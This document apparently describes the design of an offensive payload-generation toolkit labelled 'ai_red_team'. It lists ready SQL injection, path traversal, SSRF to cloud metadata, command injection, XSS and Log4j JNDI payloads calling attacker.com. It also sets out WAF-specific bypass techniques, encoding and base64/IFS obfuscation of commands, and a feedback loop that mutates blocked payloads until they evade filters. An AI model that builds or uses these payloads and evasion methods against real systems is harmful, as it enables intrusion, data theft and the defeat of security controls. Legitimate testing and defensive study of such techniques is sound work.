# Tier 2 Implementation Details

## File Locations
- `/home/kevin/ai_red_team/payloads/tier2_adaptive.py` (662 lines)
- `/home/kevin/ai_red_team/payloads/tier2_evasion.py` (739 lines)

## tier2_adaptive.py - Complete Implementation

### TechStackMapper Class
**Purpose:** Maps detected technologies to optimal exploitation payloads

**Tech Mappings (15 technologies):**
```
mysql          → sql_injection (0.95 confidence)
apache         → path_traversal + cve (0.85)
nginx          → ssrf + request_smuggling (0.80)
php            → template_injection (twig, smarty, blade) (0.90)
python         → template_injection (jinja2, mako, django) (0.88)
java           → log4j + spring (0.92)
node           → command_injection (0.87)
wordpress      → credential_testing + plugin_exploit (0.84)
oracle         → sql_injection (oracle-specific) (0.93)
postgres       → sql_injection (blind-sql) (0.94)
mssql          → sql_injection (stacked-queries) (0.92)
mongodb        → nosql_injection (0.89)
redis          → command_injection (0.91)
elasticsearch  → query_injection (0.85)
graphql        → query_injection (introspection) (0.82)
```

**Key Methods:**
- `map_tech_to_payloads(tech_stack: list) → dict` - Returns ranked payloads with confidence
- `get_combined_confidence(tech_stack: list) → float` - Average confidence across all techs

### AdaptivePayloadGenerator Class
**Purpose:** Generate context-aware payloads with optional LLM enhancement

**Tier 1 Payload Templates:**
- sql_injection: `' OR '1'='1`, `' UNION SELECT NULL--`, `' AND SLEEP(5)--`, `'; DROP TABLE users--`
- path_traversal: `../../../etc/passwd`, `....//....//etc/passwd`, encoded variants
- ssrf: `http://127.0.0.1:8080`, `http://169.254.169.254/latest/meta-data/`, `gopher://localhost:6379/`
- template_injection: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `{# test #}`
- command_injection: `; cat /etc/passwd`, `| whoami`, `` ` id ` ``, `$(whoami)`
- log4j: `${jndi:ldap://attacker.com/a}`, `${jndi:rmi://attacker.com/a}`

**4-Step Generation Process:**
1. **Tech Mapping**: Use TechStackMapper to select relevant Tier 1 payloads
2. **LLM Enhancement**: Optional call to cognitive_engine.generate_exploit()
3. **Mutation**: Apply basic mutations (URL encode, case variation, comments)
4. **Ranking**: Sort by estimated success probability, deduplicate

**Key Methods:**
- `generate_for_context(tech_stack, vulnerabilities, kb_top_payloads) → list[dict]`
  - Returns top 50 ranked payloads with confidence scores
  - Integrates LLM if available
  - Applies smart mutations
  
- `generate_from_feedback(original_payload, execution_result) → list[dict]`
  - Analyzes failure modes from error messages
  - Selects appropriate evasion techniques
  - Returns mutation variants with explanations
  
- `_estimate_success(payload, tech_stack) → float`
  - Heuristic scoring: 0.5 base + bonuses for:
    - Payload complexity (>30 chars: +0.05, >100 chars: +0.05)
    - Tech stack alignment: +0.10
    - Known patterns (UNION, SELECT, OR, etc.): +0.05
  - Caps at 0.95

**Mutation Techniques Applied:**
- URL encoding (level 1)
- Case variation (upper, lower, alternating)
- Comment insertion (SQL /\*\*/)
- Null byte injection (%00)
- Whitespace variation (tabs, spaces, newlines)

### PayloadRanker Class
**Purpose:** Rank and deduplicate payloads intelligently

**Ranking Criteria (customizable weights):**
- Confidence: 60% (from source recommendation)
- Novelty: 20% (inverse of payload length)
- Evasion: 20% (bonus for mutations and LLM-derived)

**Deduplication:**
- Uses MD5 hash of normalized payload (lowercase, no spaces, no newlines)
- Removes semantically identical payloads
- Preserves order (highest-ranked variants kept)

**Key Methods:**
- `rank(payloads, criteria) → list[dict]` - Scores and sorts
- `deduplicate(payloads) → list[dict]` - Removes duplicates

---

## tier2_evasion.py - Complete Implementation

### PolymorphicEngine Class
**Purpose:** Generate polymorphic variants using multiple encoding/obfuscation techniques

**Encoding Techniques:**

1. **URL Encoding**
   ```python
   url_encode(payload, level=1)  # level 1 or 2
   Example: "test" → "test" → "%74%65%73%74" (level 2)
   ```

2. **Base64 Encoding**
   ```python
   base64_encode(payload)
   Example: "test" → "base64:dGVzdA=="
   ```

3. **Hex Encoding**
   ```python
   hex_encode(payload)
   Example: "test" → "0x74657374"
   ```

4. **Unicode Encoding**
   ```python
   unicode_encode(payload)
   Example: "SELECT" → "\u0053\u0045\u004c\u0045\u0043\u0054"
   ```

5. **Double Encoding**
   ```python
   double_encode(payload)
   Chains two URL encodings for bypass
   ```

**Obfuscation Techniques:**

1. **Case Variation** (6 patterns)
   ```python
   case_variation(payload)  # Returns list of:
   - UPPERCASE
   - lowercase
   - Capitalized
   - AlTeRnAtInG (even positions upper)
   - aLtErNaTiNg (even positions lower)
   - rAnDoM cAsE
   ```

2. **Null Byte Injection**
   ```python
   null_byte_inject(payload)
   - %00 at start
   - %00 at end
   - %00 at strategic positions (1, 2, 3, 4, 5 chars in)
   - %00 replacing spaces
   Returns list of variants
   ```

3. **Comment Insertion** (language-aware)
   ```python
   comment_insert(payload, language)
   
   SQL:    ' AND ' → ' /**/AND/**/ '
   HTML:   payload → <!--payload-->
   Shell:  ; → ;#comment\n
   C:      space → /* */ (space)
   ```

4. **Whitespace Variation** (7 patterns)
   ```python
   whitespace_variation(payload)  # Returns:
   - Space → Tab
   - Space → Double space
   - Space → Triple space
   - Space → Newline
   - Space → Mixed (\t, space, \n rotation)
   - Space → \t + space
   - Space → space + \t
   ```

5. **String Concatenation**
   ```python
   concat_split(payload, language)
   
   SQL:   "id 1" → CONCAT('id', ' ', '1')
   Shell: "id 1" → id${IFS}1
   ```

**Mutation Strategy:**
- `mutate(payload, techniques=None, count=10)`
- Applies multiple techniques in sequence
- Generates 10+ unique variants
- Uses deduplication to avoid duplicates

### WAFBypass Class
**Purpose:** Detect WAF type and generate bypass variants

**Supported WAFs:**
1. **ModSecurity**
   - Signatures: UNION, SELECT, INSERT, SCRIPT, PATH TRAVERSAL
   - Bypass: Case variation, URL encode, comments, null bytes, whitespace

2. **Cloudflare**
   - Signatures: UNION, SELECT, DROP, EVAL, XSS, SCRIPT
   - Bypass: Double encode, unicode, base64

3. **AWS WAF**
   - Signatures: UNION+SELECT patterns, XSS, PATH TRAVERSAL
   - Bypass: Whitespace, comments, case variation

4. **Imperva**
   - Signatures: UNION, SELECT, WHERE, SYSTEM, CMD, EXEC
   - Bypass: String concatenation, hex encode, URL encode

**Detection Method:**
- Checks response headers for WAF signatures
- Analyzes response body for block pages
- Falls back to generic bypass for unknowns

**Key Methods:**
- `bypass(payload, waf_type) → list[str]` - Returns bypass variants
- `detect_waf(response_headers, response_body) → str` - Identifies WAF type

### MetamorphicEngine Class
**Purpose:** Semantic rewriting and structural variation

**Rewriting Modes:**
1. **LLM-Based** (if cognitive_engine available)
   - Calls engine.rewrite_payload()
   - Maintains functionality
   - Fallback to structural variation

2. **Structural Variation** (4+ patterns per type)

**SQL Variations:**
```python
Original: SELECT * FROM users WHERE id=1

Var 1: Comment insertion
       SELECT /**/ * /**/ FROM /**/ users /**/ WHERE /**/ id=1

Var 2: Keyword replacement
       sElEcT * FROM users WHERE id=1

Var 3: Concatenation
       CONCAT('SELECT', ' ', '*') FROM users WHERE id=1

Var 4: Whitespace variation
       SELECT\t*\tFROM\tusers\tWHERE\tid=1
```

**Command Variations:**
```python
Original: cat /etc/passwd

Var 1: IFS substitution
       cat${IFS}/etc/passwd

Var 2: Quote changes
       cat "/etc/passwd"  (backtick to dollar-paren)

Var 3: Escaping
       cat\ /etc/passwd
```

**XSS Variations:**
```python
Original: <script>alert(1)</script>

Var 1: Event handler change
       <img onerror=alert(1)>

Var 2: SVG variant
       <svg onload=alert(1)>

Var 3: Different event
       <body onclick=alert(1)>
```

**SQL Keyword Synonyms:**
```python
SELECT → sElEcT (6 case variations)
UNION → UnIoN
WHERE → WhErE
AND → AnD
OR → Or
INSERT, UPDATE, DELETE, DROP, TABLE, FROM, JOIN
```

**Command Obfuscation:**
```python
obfuscate_command("cat /etc/passwd")
→ "cat${IFS}/etc/passwd"  (IFS substitution)
→ "cat${IFS}$(echo L2V0Yy9wYXNzd2Q=|base64 -d)"  (base64 encoded)
```

---

## Cross-Module Integration

### tier2_adaptive.py → tier2_evasion.py
```python
AdaptivePayloadGenerator._apply_basic_mutations()
├─ Uses PolymorphicEngine.url_encode()
├─ Uses PolymorphicEngine.case_variation()
└─ Uses PolymorphicEngine.comment_insert()

AdaptivePayloadGenerator.generate_from_feedback()
├─ Selects evasion techniques based on error type
└─ Generates mutations via PolymorphicEngine
```

### tier2_evasion.py Internal Integration
```python
PolymorphicEngine
├─ mutate() chains multiple techniques
├─ case_variation() + url_encode()
├─ null_byte_inject() + comment_insert()
└─ whitespace_variation() + concat_split()

MetamorphicEngine
├─ Uses PolymorphicEngine for basic mutations
├─ structural_variation() chains techniques
└─ obfuscate_command() uses base64 + IFS
```

---

## Performance Characteristics

| Operation | Time Complexity | Output Size |
|-----------|-----------------|-------------|
| mutate() with 10 variants | O(n) where n=payload length | 10+ unique strings |
| case_variation() | O(n) | 6 variants |
| null_byte_inject() | O(n) | 3-5 variants |
| bypass() | O(n * t) where t=techniques | 15-30 variants |
| rank() | O(p log p) where p=payloads | Sorted payloads |
| deduplicate() | O(p) with hash | Unique payloads |

---

## Example Workflows

### Workflow 1: Basic Adaptive Generation
```python
from payloads.tier2_adaptive import AdaptivePayloadGenerator

gen = AdaptivePayloadGenerator()
payloads = gen.generate_for_context(
    tech_stack=['apache', 'php', 'mysql'],
    vulnerabilities=[{'type': 'sql_injection', 'severity': 'high'}]
)
# Returns 20-50 payloads ranked by confidence
```

### Workflow 2: Feedback-Driven Mutation
```python
result = execute_payload(payloads[0])
if result['status'] == 'blocked':
    new_payloads = gen.generate_from_feedback(
        original_payload=payloads[0]['payload'],
        execution_result=result
    )
    # Returns mutations optimized for bypass
```

### Workflow 3: WAF Bypass
```python
from payloads.tier2_evasion import WAFBypass

waf = WAFBypass()
detected = waf.detect_waf(response_headers, response_body)
bypass_variants = waf.bypass(payload, detected)
# Returns WAF-specific bypass variants
```

### Workflow 4: Polymorphic Generation
```python
from payloads.tier2_evasion import PolymorphicEngine

poly = PolymorphicEngine()
mutations = poly.mutate("' OR '1'='1", count=20)
# Returns 20 unique mutations using different techniques
```

### Workflow 5: Semantic Rewriting
```python
from payloads.tier2_evasion import MetamorphicEngine

meta = MetamorphicEngine()
variants = meta.structural_variation("SELECT * FROM users")
rewritten = meta.synonym_replace("SELECT * FROM users")
# Returns semantically equivalent but structurally different payloads
```

---

## Validation Results

Both files pass:
- ✓ Python syntax validation (`py_compile`)
- ✓ Import tests (all classes instantiate correctly)
- ✓ Method tests (all major methods execute without errors)
- ✓ Integration tests (cross-module method calls work)
- ✓ Output validation (returns expected data types)

**Test Output:**
```
TechStackMapper: ✓ Maps 15 technologies correctly
AdaptivePayloadGenerator: ✓ Generates 20+ payloads per context
PayloadRanker: ✓ Ranks and deduplicates payload sets
PolymorphicEngine: ✓ Creates 10+ mutations per payload
WAFBypass: ✓ Detects 4 WAF types, generates bypasses
MetamorphicEngine: ✓ Creates 5+ structural variations
```

---

## Future Enhancement Points

1. **Database Integration**
   - Store payload success rates
   - Learning from execution feedback
   - Historical effectiveness tracking

2. **LLM Integration**
   - CognitiveEngine for semantic generation
   - Runtime payload optimization
   - Advanced rewriting strategies

3. **Evaluation Metrics**
   - Success rate tracking per technique
   - WAF evasion effectiveness
   - Payload diversity scoring

4. **Extended Coverage**
   - More languages (C#, Go, Rust, etc.)
   - Additional WAF types (ModSecurity >= 3.0, etc.)
   - Advanced encoding chains (XOR, RC4, etc.)

5. **Performance Optimization**
   - Caching of common mutations
   - Parallel mutation generation
   - Incremental ranking
